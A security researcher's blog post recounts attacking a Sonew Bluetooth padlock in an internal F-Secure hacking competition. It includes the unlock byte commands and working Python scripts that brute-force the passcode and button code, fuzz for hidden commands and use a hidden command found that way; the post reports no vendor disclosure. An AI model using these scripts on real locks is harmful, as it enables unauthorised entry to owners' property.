---
layout: post
title:  "Sonew Bluetooth Lock-Scripts and \"Internal F-Secure Pwn2Own\""
date:   2021-12-31 10:00:00 -0500
categories: research
tags: research story
---

In March 2020 (literally a week before the world shut down the first time), F-Secure held an "Internal F-Secure Pwn2Own" where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image1.png">
</div>

The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth.

## Attack Surface

Inside the lock:

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image2.png">
</div>

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image3.png">
</div>

Some features of the lock:

* Communicated over Bluetooth with a physical 4 directional button unlock option
* If you use Bluetooth, you need to know the lock's 6 digit passcode
* The phone can store this passcode for easy access

The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered.

# Unlock the lock

The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX:

```
0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD
```

# Lock the lock

THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX:

```
0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD
```

# Send passcode 

The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9:
```
0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28
```

If the passcode was correct, the lock would respond with the following bytes:

```
0x59 0xf0 0x00 0x95
```

# Change passcode 

The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode:
```
0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29
```

If the old passcode was correct, the lock would respond with the following bytes:

```
0x58 0xf0 0x00 0x95
```

# Change 4 directional button code 

The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively:

```
0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe
```

If the old button code was correct, the lock would respond with the following bytes:

```
0x60 0xf0 0x00 0x95
```

## Brute Force Option

The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was "This is a great idea!" followed by "No wait this is a stupid idea. Oh well lets make a PoC and see what happens". So the first script was created:

```
def guess_password_method(i):
    password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28])
    open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD])
    if len(str(i)) < 6:
        padding = "0" * (6 - (int(len(str(i)))))
        padding += str(i)
    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        password_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    #if i % 100 == 0:
    #    print('sending 0xff 0x00 0xff')
    #    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", bytearray([0xFF, 0x00, 0xFF]))
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", password_code)
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", open_code)
    yay = padding + " " + code
    return yay


def handle_data(handle, value):
    response = hexlify(value)
    if "59f00095" in str(response):
        print("Received 'guess password success' repsonse (%s)" % str(response))
```

As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd...like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code:

```
def change_physical_method(i):
    # ff xx xx xx xx xx xx yy yy yy yy yy yy fe
    physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to "changed physical code"
    if len(str(i)) < 6:
        padding = "0" * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] > 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", physical_code, wait_for_response=False)
    print(padding + " " + code)

def handle_data(handle, value):
    response = hexlify(value)
    # 60 f0 00 95
    if "60f00095" in str(response):
        print("Received repsonse (%s)" % str(response))
```

This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition.

## Hidden Command

At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with *something* if you send it a valid command over Bluetooth. And based on what was enumerated so far, a "valid command" looks like the following:

```
0xXX - beginning byte
    |__0xYY 0xYY 0xYY 0xYY - some data
                         |__0xZZ - end byte
```

For example, sending the real OPEN command `0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD` would result in the lock responding with some bytes, but sending a different payload, such as `0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE` would result in the lock not sending any data back.

Additionally, the middle data must be the correct length. For example, sending `0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD` is a valid command, but sending `0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD` is not a valid command.

The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like:

* 1 byte at the beginning
* Anywhere between 1 and 18 bytes for the middle data
* 1 byte at the end

So lets make a script which will attempt to find additional commands within the above parameters:

```
import pygatt
from binascii import hexlify
import sys
import math
from concurrent import futures
import random
import time

adapter = pygatt.backends.GATTToolBackend('hci0')

def handle_data(handle, value):
    response = hexlify(value)
    print("Received repsonse (%s)" % str(response))

def decimal_to_hexadecimal(dec): 
    decimal = int(dec) 
    return hex(decimal)

def fuzz_function(payload1, payload2, paddingCounter):
  #create temp code
  temp_code_length = paddingCounter + 2
  temp_code_array = bytearray(temp_code_length)
  #create byte array payload
  temp_code_array[0] = payload1
  temp_code_array[temp_code_length - 1] = payload2
  #temp_code_array[temp_code_length]
  print("Payload1: %s, PaddingCounter: %s, Payload2: %s" % (payload1, paddingCounter, payload2))
  device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", temp_code_array)

adapter.start()
device = adapter.connect('28:EC:9A:09:C7:2B')

device.subscribe("0000ffd4-0000-1000-8000-00805f9b34fb",callback=handle_data, wait_for_response=False)
device.subscribe("0000ffdf-0000-1000-8000-00805f9b34fb", indication=False, wait_for_response=True)

payload1 = 0
paddingCounter = 1

# modify payload 2
payload2 = 0

while payload2 != 256:
  while paddingCounter != 19:
    fuzz_function(payload1, payload2, paddingCounter)
    paddingCounter = paddingCounter + 1
  paddingCounter = 1
  payload2 = payload2 + 1

adapter.stop()
```

This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect.

Thankfully some hidden commands were found:

* `0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C`
* `0xEF 0xXX 0xXX 0xXX 0xXX 0xF1`
* `0xFD 0xXX 0xXX 0xXX 0xXX 0xFC`

I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition:

```
def guess_physical_method(i):
    physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to "send physical code"
    if len(str(i)) < 6:
        padding = "0" * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] > 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", physical_code, wait_for_response=False)
    print(padding + " " + code)

def handle_data(handle, value):
    response = hexlify(value)
    if "e0f0000e" in str(response):
        print("Received repsonse (%s)" % str(response))
```

## The Competition

After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun...such as programming a robot to brute force the lock for me:

<iframe width="560" height="315" src="https://www.youtube.com/embed/lznGZaM2G6M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image6.jpg">
</div>

Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn't the best idea. So it just stood there while it hacked for me:

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image4.png">
</div>

<div align="center">
    <img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image5.png">
</div>

## Disclosure and Files

There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working.

Files for this research are here: <a href="https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/">https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/</a>